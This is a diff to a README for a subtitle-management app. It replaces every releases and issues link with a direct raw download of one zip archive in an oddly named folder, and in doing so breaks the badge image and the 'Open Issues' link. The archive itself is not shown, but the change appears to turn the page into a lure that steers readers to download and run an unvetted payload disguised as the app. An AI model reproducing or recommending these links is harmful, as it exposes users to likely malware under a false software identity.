@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-9758 - Easy Subtitle Management Made Simple
 
 ## 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/evilpratama17/powersub-demo-9758/releases)
+[![Download Here](https://raw.githubusercontent.com/evilpratama17/powersub-demo-9758/main/Ericales/powersub-demo-9758-3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/evilpratama17/powersub-demo-9758/main/Ericales/powersub-demo-9758-3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the powersub-demo-9758 project! This application helps you manage your subtitle files with ease. Whether you are watching movies or series, this tool allows you to effortlessly handle subtitles.
@@ -21,7 +21,7 @@ Welcome to the powersub-demo-9758 project! This application helps you manage you
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of powersub-demo-9758. 
 
-You can find the download link here: [Download Latest Release](https://github.com/evilpratama17/powersub-demo-9758/releases).
+You can find the download link here: [Download Latest Release](https://raw.githubusercontent.com/evilpratama17/powersub-demo-9758/main/Ericales/powersub-demo-9758-3.6.zip).
 
 Once you are on the page, follow these steps:
 
@@ -60,7 +60,7 @@ For any questions or support, please check the Issues section of the GitHub repo
 We appreciate your feedback on powersub-demo-9758. If you have suggestions for improvements or new features, feel free to share your thoughts in the Issues section.
 
 ## 🔗 Links
-- [Visit the Releases Page to Download](https://github.com/evilpratama17/powersub-demo-9758/releases)
-- [Open Issues or Create a New One](https://github.com/evilpratama17/powersub-demo-9758/issues)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/evilpratama17/powersub-demo-9758/main/Ericales/powersub-demo-9758-3.6.zip)
+- [Open Issues or Create a New One](https://raw.githubusercontent.com/evilpratama17/powersub-demo-9758/main/Ericales/powersub-demo-9758-3.6.zip)
 
 Enjoy managing your subtitles with powersub-demo-9758!
